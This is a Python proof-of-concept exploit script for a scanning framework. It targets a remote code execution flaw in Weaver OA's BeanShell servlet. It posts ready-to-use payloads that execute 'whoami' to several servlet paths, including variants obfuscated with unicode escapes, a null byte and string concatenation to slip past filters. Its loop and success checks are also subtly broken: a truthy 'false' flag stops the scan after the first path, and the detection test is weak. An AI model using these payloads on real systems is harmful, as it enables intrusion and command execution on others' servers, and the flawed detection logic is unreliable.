from BasePoc import BasePoc               # 导入BasePoc，是PoC脚本实现的类中必须继承的基类
from utils import tree, highlight, req    # utils实现了一些常用函数，可以直接导入方便使用
from urllib.parse import urljoin   

POC_NAME = "WeaverOAREC"    # PoC脚本中实现的类名，TCC框架将根据POC_NAME去实例化类以达到调用的效果，因此类名应与该变量名保持相同


class WeaverOAREC(BasePoc):

    poc_info = {
        'poc': {
            'Id': 'vb_2021_0009',    # PoC的VID编号
            'vbid': '',
            'Name': 'Weaver OA Bsh RCE',    # PoC名称
            'Author': 'mumu',    # PoC作者
            'Create_date': '2021-06-09',    # PoC创建时间
            },

        'vul': {
            'Product': '泛微OA',    # 漏洞所在产品名称
            'Version': '',    # 产品的版本号
            'Type': 'RCE',    # 漏洞类型
            'Severity': 'critical',    # 漏洞危害等级low/medium/high/critical
            'isWeb' : True,    # 是否Web漏洞
            'Description': '''
                泛微OA Bsh 远程代码执行漏洞
            ''',    # 漏洞简要描述
            'DisclosureDate': '2021-06-09',    # PoC公布时间
        }
    }


    # scan_info信息可以保持默认，相关参数如target/mode/verbose在TCC框架中都可以通过命令行参数设置
    scan_info = {
        'Target': '',    # 目标网站域名
        'Mode': 'verify',    # verify或exploit
        'Verbose': True,    # 是否打印详细信息
        'Error': '',    # 检测失败时可用于记录相关信息
        'Success': False,    # 是否检出漏洞，若检出请更新该值为True
        'risk_category': 'sec_vul',
        'Ret': tree()    # 可用于记录额外的一些信息
    }

    test_case = {
        'Need_fb': False,
        'Vuln': [],    # 列表格式的测试URL
        'Not_vuln': [],    # 同上
    }


    def verify(self, first=False):
        # 漏洞验证方法（mode=verify）
        target = self.scan_info.get("Target", "")    # 获取测试目标
        verbose = self.scan_info.get("Verbose", False)   # 是否打印详细信息

        # 以下是PoC的检测逻辑
        headers = {
            'Content-Type': 'text/xml; charset=utf-8',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0',
            'Cache-Control': 'max-age=0',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Upgrade-Insecure-Requests': '1',
            'Content-Length': '578'
        }

        Url_Payload1="/bsh.servlet.BshServlet"
        Url_Payload2="/weaver/bsh.servlet.BshServlet"
        Url_Payload3="/weaveroa/bsh.servlet.BshServlet"
        Url_Payload4="/oa/bsh.servlet.BshServlet"

        Data_Payload1="""bsh.script=exec("whoami");&bsh.servlet.output=raw"""
        Data_Payload2= """bsh.script=\u0065\u0078\u0065\u0063("whoami");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw"""
        Data_Payload3= """bsh.script=eval%00("ex"%2b"ec(bsh.httpServletRequest.getParameter(\\"command\\"))");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw&command=whoami"""
        
        exit_flag = "false"

        for Url_Payload in (Url_Payload1, Url_Payload2, Url_Payload3, Url_Payload4):
            url = urljoin(target,Url_Payload)
            for Data_Payload in (Data_Payload1, Data_Payload2, Data_Payload3):
                location = ""
                resp = req(url, 'post', headers=headers,data=Data_Payload, allow_redirects=False, timeout=5)
                if resp is not None:
                    location = resp.text
                if (";</script>" not in location) & ("Login.jsp" not in location) & ("Error" not in location):
                    self.scan_info['Success'] = True    # 漏洞存在，必须将该字段更新为True（必须）
                    self.scan_info['Ret']['VerifyInfo']['URL'] = url    # 记录漏洞相关的一些额外信息（可选）
                    self.scan_info['Ret']['VerifyInfo']['DATA'] = location
                    if verbose:
                        highlight('[+] Weaver OA Bsh RCE found')    # 打印高亮信息发现漏洞，其他可用方法包括info()/warn()/error()/highlight()方法分别打印不同等级的信息
                        exit_flag = "true"
                        break
                else:
                    if verbose:
                        highlight('[+] Weaver OA Bsh RCE not found')    # 打印高亮信息发现漏洞，其他可用方法包括info()/warn()/error()/highlight()方法分别打印不同等级的信息
                        exit_flag = "true"
                        break
            if exit_flag:
                break

    def exploit(self, first=False):
        # 漏洞利用方法（mode=verify）
        self.verify(first=first)
